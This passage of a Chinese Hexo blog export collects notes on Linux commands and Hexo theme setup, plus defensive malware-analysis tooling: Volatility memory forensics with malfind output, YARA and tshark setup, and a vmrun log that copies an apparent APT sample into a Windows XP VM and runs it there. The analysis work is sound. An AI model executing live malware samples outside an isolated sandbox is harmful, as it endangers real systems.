255.255.255.0</span><br></pre></td></tr></table></figure><p> 重启生效:</p><p> 修改vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p></li><li><p>修改default gateway</p><p> 即时生效:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add default gw 192.168.1.1</span><br></pre></td></tr></table></figure><p> 重启生效:</p><p> 修改vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p></li><li><p>修改dns</p><p> 修改vi &#x2F;etc&#x2F;resolv.conf（修改后即时生效，重启同样有效）</p></li><li><p>修改host name</p><p> 即时生效:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname test1</span><br></pre></td></tr></table></figure><p> 重启生效:</p><p> 修改vi &#x2F;etc&#x2F;sysconfig&#x2F;network</p></li></ol><h2 id="4、其他指令"><a href="#4、其他指令" class="headerlink" title="4、其他指令"></a>4、其他指令</h2><ul><li>查看文件夹大小<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h --max-depth=1</span><br></pre></td></tr></table></figure></li><li>依赖安装<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure></li><li>挂载&#x2F;system为可读写<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount,rw /system</span><br></pre></td></tr></table></figure></li><li>查看系统是32位还是64位(3个命令都可以)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getconf LONG_BIT 或 getconf WORD_BIT</span><br><span class="line">file /bin/ls</span><br><span class="line">lsb_release  -a</span><br></pre></td></tr></table></figure></li></ul><h2 id="5、压缩解压"><a href="#5、压缩解压" class="headerlink" title="5、压缩解压"></a>5、压缩解压</h2><h3 id="5-1-tar-gz"><a href="#5-1-tar-gz" class="headerlink" title="5.1 tar.gz"></a>5.1 tar.gz</h3><p>压缩(可先切换到当前目录下，压缩文件名和被压缩文件名都可加入路径)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 压缩文件名 .tar.gz 被压缩文件名</span><br></pre></td></tr></table></figure><p>解压(解压缩后的文件只能放在当前的目录)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf 压缩文件名.tar.gz</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo next主题自定义配置</title>
      <link href="/2019/11/28/hexo-next%E4%B8%BB%E9%A2%98%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/11/28/hexo-next%E4%B8%BB%E9%A2%98%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1、添加菜单"><a href="#1、添加菜单" class="headerlink" title="1、添加菜单"></a>1、添加菜单</h2><p>编辑themes&#x2F;hexo-theme-next&#x2F;_config.yml文件，添加格式如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  movie: /movie/ || film</span><br></pre></td></tr></table></figure><p>film为图标名称，需要的图标，在下面网站查找关键字，输入对应的名称即可<br><a href="https://fontawesome.com/v4.7.0/icons/">https://fontawesome.com/v4.7.0/icons/</a></p><h2 id="2、添加置顶功能"><a href="#2、添加置顶功能" class="headerlink" title="2、添加置顶功能"></a>2、添加置顶功能</h2><h3 id="2-1、安装库"><a href="#2-1、安装库" class="headerlink" title="2.1、安装库"></a>2.1、安装库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm uninstall hexo-generator-index --save</span><br><span class="line">$ npm install hexo-generator-index-pin-top --save</span><br></pre></td></tr></table></figure><p>然后在需要置顶的文章的Front-matter中加上top: true即可,如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 我的2019总结</span><br><span class="line"><span class="built_in">date</span>: 2019-12-31 11:45:59</span><br><span class="line">tags:</span><br><span class="line">  - 随笔</span><br><span class="line">categories:</span><br><span class="line">  - 随笔</span><br><span class="line">top: <span class="literal">true</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="2-2-设置置顶标志"><a href="#2-2-设置置顶标志" class="headerlink" title="2.2 设置置顶标志"></a>2.2 设置置顶标志</h3><p>打开：&#x2F;themes&#x2F;next&#x2F;layout&#x2F;_macro目录下的post.swig文件，定位到&lt;div class&#x3D;”post-meta”&gt;标签下，插入如下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> post.top %&#125;</span><br><span class="line">    &lt;i class=<span class="string">&quot;fa fa-thumb-tack&quot;</span>&gt;&lt;/i&gt;</span><br><span class="line">    &lt;font color=<span class="string">&quot;green&quot;</span>&gt;置顶&lt;/font&gt;</span><br><span class="line">    &lt;span class=<span class="string">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下volatility2.3.1的安装和使用</title>
      <link href="/2019/11/27/mac%E4%B8%8Bvolatility2.3.1%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/11/27/mac%E4%B8%8Bvolatility2.3.1%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><p>google 2.3.1版本下载地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://code.google.com/archive/p/volatility/downloads</span><br></pre></td></tr></table></figure><blockquote><p><strong>最新的下载版本为2.6.1，地址为”<a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a>“<br>安装和使用方法类似这篇文章的2.3.1版本,详细的使用见这篇文章“<a href="https://xz.aliyun.com/t/2497%E2%80%9D">https://xz.aliyun.com/t/2497”</a></strong></p></blockquote><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 setup.py install</span><br></pre></td></tr></table></figure><p>编译和安装后的文件放在了如下路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Installing vol.py script to /usr/local/bin</span><br><span class="line"></span><br><span class="line">Installed /Library/Python/2.7/site-packages/volatility-2.3.1-py2.7.egg</span><br></pre></td></tr></table></figure><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python /usr/local/bin/vol.py pslist -f /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional-9b67ab90.vmem</span><br><span class="line"></span><br><span class="line">python2.7 /usr/local/bin/vol.py dlllist -f prolaco.vmem -p 1724</span><br><span class="line">python2.7 /usr/local/bin/vol.py pstree -f prolaco.vmem</span><br><span class="line">python2.7 /usr/local/bin/vol.py filescan -f prolaco.vmem | grep Desktop</span><br><span class="line">vol -f ram.raw yarascan -y example.yara</span><br><span class="line">vol impscan -p 1180 -f laqma.vmem //扫描目标进程的iat表，将结果导入IDA可以还原IAT的占位符为函数名</span><br></pre></td></tr></table></figure><p>再如，查找病毒特征吗命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol malfind -f silentbanker.vmem --dump-dir=outdir -p 1884</span><br></pre></td></tr></table></figure><p>需要下载distorm3，才可以对指定进程的内存数据反汇编</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install distorm3 --user</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Process: IEXPLORE.EXE Pid: 1884 Address: 0x1110000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x01110000  d9 89 d4 77 05 8b ff 55 8b ec e9 cf 89 c3 76 00   ...w...U......v.</span><br><span class="line">0x01110010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x01110020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x01110030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x1110000 d9               DB 0xd9</span><br><span class="line">0x1110001 89d4             MOV ESP, EDX</span><br><span class="line">0x1110003 7705             JA 0x111000a</span><br><span class="line">0x1110005 8bff             MOV EDI, EDI</span><br><span class="line">0x1110007 55               PUSH EBP</span><br><span class="line">0x1110008 8bec             MOV EBP, ESP</span><br><span class="line">0x111000a e9cf89c376       JMP 0x77d489de</span><br><span class="line">0x111000f 0000             ADD [EAX], AL</span><br><span class="line">0x1110011 0000             ADD [EAX], AL</span><br><span class="line">0x1110013 0000             ADD [EAX], AL</span><br></pre></td></tr></table></figure><h2 id="4、未找到（下载地址）的软件或插件"><a href="#4、未找到（下载地址）的软件或插件" class="headerlink" title="4、未找到（下载地址）的软件或插件"></a>4、未找到（下载地址）的软件或插件</h2><p>软件：<br>win32dd.exe<br>win64dd.exe<br>插件：<br>csrss_plist</p><h2 id="5、python脚本打印出的部分命令"><a href="#5、python脚本打印出的部分命令" class="headerlink" title="5、python脚本打印出的部分命令"></a>5、python脚本打印出的部分命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vol cmd: /usr/bin/python /usr/local/bin/vol.py pslist -f /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional-9b67ab90.vmem</span><br><span class="line">vol cmd: /usr/bin/python /usr/local/bin/vol.py connections -f /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional-9b67ab90.vmem</span><br><span class="line">vol cmd: /usr/bin/python /usr/local/bin/vol.py sockets -f /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional-9b67ab90.vmem</span><br><span class="line">vol cmd: /usr/bin/python /usr/local/bin/vol.py apihooks -f /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional-9b67ab90.vmem -d .tmp</span><br><span class="line">vol cmd: /usr/bin/python /usr/local/bin/vol.py malfind -f /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional-9b67ab90.vmem yarascan -y ./auto/data/yara.rules</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> virus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下自动分析恶意样本</title>
      <link href="/2019/11/26/mac%E4%B8%8B%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/"/>
      <url>/2019/11/26/mac%E4%B8%8B%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>在python中可以使用python-magic程序包确定文件的具体类型。</p><h2 id="1、安装libmagic-in-MacOS-for-python-magic"><a href="#1、安装libmagic-in-MacOS-for-python-magic" class="headerlink" title="1、安装libmagic in MacOS for python-magic"></a>1、安装libmagic in MacOS for python-magic</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install python-magic --user</span><br><span class="line">brew install libmagic</span><br></pre></td></tr></table></figure><p>其中安装libmagic有2个坑：</p><h3 id="1-1、强行升级homebrew"><a href="#1-1、强行升级homebrew" class="headerlink" title="1.1、强行升级homebrew"></a>1.1、强行升级homebrew</h3><p>如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Updating Homebrew...</span><br></pre></td></tr></table></figure><p>取消自动更新命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HOMEBREW_NO_AUTO_UPDATE=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="1-2、权限问题"><a href="#1-2、权限问题" class="headerlink" title="1.2、权限问题"></a>1.2、权限问题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: The following directories are not writable by your user:</span><br><span class="line">/usr/local/share/man/man5</span><br></pre></td></tr></table></figure><p>修改权限，解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chown</span> -R `<span class="built_in">whoami</span>`:admin /usr/local/share</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/wangyingblock/p/11121025.html">安装 libmagic in Mac OS (for Python-magic)</a></p><h2 id="2、安装yara"><a href="#2、安装yara" class="headerlink" title="2、安装yara"></a>2、安装yara</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install yara</span><br></pre></td></tr></table></figure><h2 id="3、安装yara-python"><a href="#3、安装yara-python" class="headerlink" title="3、安装yara-python"></a>3、安装yara-python</h2><p>单独编译安装yara-python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install yara-python --user</span><br></pre></td></tr></table></figure><p>也可以下载源码编译安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/VirusTotal/yara-python</span><br><span class="line">$ <span class="built_in">cd</span> yara-python</span><br><span class="line">$ python setup.py build</span><br><span class="line">$ sudo python setup.py install</span><br></pre></td></tr></table></figure><p>参考：<a href="https://pypi.org/project/yara-python/">yara-python 3.11.0</a></p><h2 id="4、tshark"><a href="#4、tshark" class="headerlink" title="4、tshark"></a>4、tshark</h2><p>tkshark -f 过滤参数出错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -i vmnet8 -w file.pcap -f host 172.16.244.221</span><br><span class="line">tshark: A capture filter was specified both with <span class="string">&quot;-f&quot;</span> and with additional command-line arguments.</span><br></pre></td></tr></table></figure><p>-f 后面要用””引起来，这样操作系统会当作一个字符串解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -i vmnet8 -w file.pcap -f <span class="string">&quot;host 172.16.244.221&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> virus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmrun命令操作VMWare Fusion</title>
      <link href="/2019/11/25/vmrun%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9CVMWare-Fusion/"/>
      <url>/2019/11/25/vmrun%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9CVMWare-Fusion/</url>
      
        <content type="html"><![CDATA[<h2 id="0、mac下路径有空格的环境变量设置"><a href="#0、mac下路径有空格的环境变量设置" class="headerlink" title="0、mac下路径有空格的环境变量设置"></a>0、mac下路径有空格的环境变量设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> XP=/Users/owner/Virtual\ Machines.localized/Windows\ XP\ Professional/Windows\ XP\ Professional.vmx</span><br></pre></td></tr></table></figure><p>在正确导出变量时非常痛苦，总是确保在shell中引用变量时双引引变量，即：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;<span class="variable">$XP</span>&quot;</span></span><br></pre></td></tr></table></figure><p>而不是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$XP</span></span><br></pre></td></tr></table></figure><p>会有意想不到的结果</p><h2 id="1、列出快照"><a href="#1、列出快照" class="headerlink" title="1、列出快照"></a>1、列出快照</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/Virtual Machines.localized/Windows XP Professional$ vmrun listSnapshots <span class="string">&quot;<span class="variable">$XP</span>&quot;</span></span><br><span class="line">Total snapshots: 4</span><br><span class="line">Clean</span><br><span class="line">work</span><br><span class="line">ransomware</span><br><span class="line">vulnerability</span><br></pre></td></tr></table></figure><h2 id="2、恢复并启动某快照"><a href="#2、恢复并启动某快照" class="headerlink" title="2、恢复并启动某快照"></a>2、恢复并启动某快照</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmrun revertToSnapshot <span class="string">&quot;<span class="variable">$XP</span>&quot;</span> vulnerability</span><br><span class="line">vmrun start <span class="string">&quot;<span class="variable">$XP</span>&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3、将文件从主机拷贝到客户机"><a href="#3、将文件从主机拷贝到客户机" class="headerlink" title="3、将文件从主机拷贝到客户机"></a>3、将文件从主机拷贝到客户机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmrun -gu Administrator -gp 123456 copyFileFromHostToGuest <span class="string">&quot;<span class="variable">$XP</span>&quot;</span> /Users/owner/Work/virus/cs/http.exe C:\\http.exe</span><br></pre></td></tr></table></figure><h2 id="4、执行客户机文件"><a href="#4、执行客户机文件" class="headerlink" title="4、执行客户机文件"></a>4、执行客户机文件</h2><p>runProgramInGuest指定了允许执行到程序创建窗口并可在桌面上与用户交互（-activeWindow -interactive），并且vmrun不必等待虚拟机中的进程终止（-noWait）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmrun -gu Administrator -gp 123456 runProgramInGuest <span class="string">&quot;<span class="variable">$XP</span>&quot;</span> -noWait -activeWindow -interactive c:\\windows\\notepad.exe</span><br></pre></td></tr></table></figure><h2 id="5、python脚本打印出的部分命令"><a href="#5、python脚本打印出的部分命令" class="headerlink" title="5、python脚本打印出的部分命令"></a>5、python脚本打印出的部分命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Executing revertToSnapshot please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion revertToSnapshot /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx vulnerability</span><br><span class="line">Executing start please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion start /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx</span><br><span class="line">Executing readVariable please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion -gu Administrator -gp 123456 readVariable /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx guestEnv tmp</span><br><span class="line">Executing copyFileFromHostToGuest please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion -gu Administrator -gp 123456 copyFileFromHostToGuest /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx /Users/owner/Company/Venus/2019apt/Chafer-APT/events.exe C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\events.exe</span><br><span class="line">Executing runProgramInGuest please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion -gu Administrator -gp 123456 runProgramInGuest /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx -noWait -interactive -activeWindow C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\events.exe</span><br><span class="line">Executing captureScreen please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion -gu Administrator -gp 123456 captureScreen /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx ./auto/reports/25469ddaeff0dd3edb0f39bbe1dcdc46/shot.bmp</span><br><span class="line">Executing <span class="built_in">suspend</span> please <span class="built_in">wait</span>...</span><br><span class="line">vm cmd: /Applications/VMware Fusion.app/Contents/Public/vmrun -T fusion <span class="built_in">suspend</span> /Users/owner/Virtual Machines.localized/Windows XP Professional/Windows XP Professional.vmx</span><br></pre></td></tr></table></figure><h2 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h2><p><a href="https://docs.vmware.com/cn/VMware-Fusion/11/com.vmware.fusion.using.doc/GUID-FF306A59-080E-497E-857D-F45125927FB3.html?hWord=N4IghgNiBcIE4FMBuC4BcAqB7AygOzAAcBnACyzRAF8g">vmrun 命令示例</a></p>]]></content>
      
      
      <categories>
          
          <category> virus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一台电脑部署两个GitHub账号</title>
      <link href="/2019/11/23/%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E9%83%A8%E7%BD%B2%E4%B8%A4%E4%B8%AAGitHub%E8%B4%A6%E5%8F%B7/"/>
      <url>/2019/11/23/%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E9%83%A8%E7%BD%B2%E4%B8%A4%E4%B8%AAGitHub%E8%B4%A6%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="1、生成第二个ssh-key"><a href="#1、生成第二个ssh-key" class="headerlink" title="1、生成第二个ssh key"></a>1、生成第二个ssh key</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-keygen -t rsa -C <span class="string">&quot;catcat@gmail.com&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2、打开ssh-agent-添加私钥"><a href="#2、打开ssh-agent-添加私钥" class="headerlink" title="2、打开ssh-agent,添加私钥"></a>2、打开ssh-agent,添加私钥</h2><p>添加不同的ssh认证信息（本地使用不同的GitHub账号，需要不同的 SSH 认证登录）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-agent -s</span><br><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-add ~/.ssh/id_rsa</span><br><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-add ~/.ssh/id_rsa_catcat</span><br></pre></td></tr></table></figure><p>查看添加后的认证信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-add -l</span><br><span class="line">3072 SHA256:PxvHneilxxx xxx@outlook.com (RSA)</span><br><span class="line">3073 SHA256:PxvHneilyyy yyy@outlook.com (RSA)</span><br><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-add -L</span><br><span class="line">ssh-rsa AAAAB3Nzxxx xxx@outlook.com</span><br><span class="line">ssh-rsa AAAAB3Nzyyy yyy@outlook.com</span><br></pre></td></tr></table></figure><p>如果之后个人blog用hexo d提交代码时出现如下错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Permission to yyy.git denied to xxx(username)</span><br></pre></td></tr></table></figure><p>是因为ssh使用了默认的认证信息（xxx）提交（ssh-add -l后有多个认证信息），而不是我们的第二个账号的认证信息（yyy），解决办法:新启一个ssh-agent并添加第二个账号的认证信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ <span class="built_in">eval</span> $(ssh-agent)</span><br><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-add ~/.ssh/id_rsa_yyy</span><br></pre></td></tr></table></figure><p>查看添加后的认证信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ ssh-add -l</span><br><span class="line">3073 SHA256:PxvHneilyyy yyy@outlook.com (RSA)</span><br></pre></td></tr></table></figure><p>在当前shell中 hexo d提交</p><h2 id="3、创建并修改config文件"><a href="#3、创建并修改config文件" class="headerlink" title="3、创建并修改config文件"></a>3、创建并修改config文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ <span class="built_in">touch</span> config</span><br><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ vim config</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># github</span></span><br><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa</span><br><span class="line">    User dogdog</span><br><span class="line"></span><br><span class="line"><span class="comment"># github </span></span><br><span class="line">Host catcat.github.com <span class="comment">#这里的设置很关键，是第二个解析的别名，后续hexo依靠在__config.yml文件的对应设置（选择对应的ssh key）来部署到GitHub pages上</span></span><br><span class="line">    HostName github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_catcat</span><br><span class="line">    User catcat</span><br></pre></td></tr></table></figure><p>验证添加是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/.ssh$ 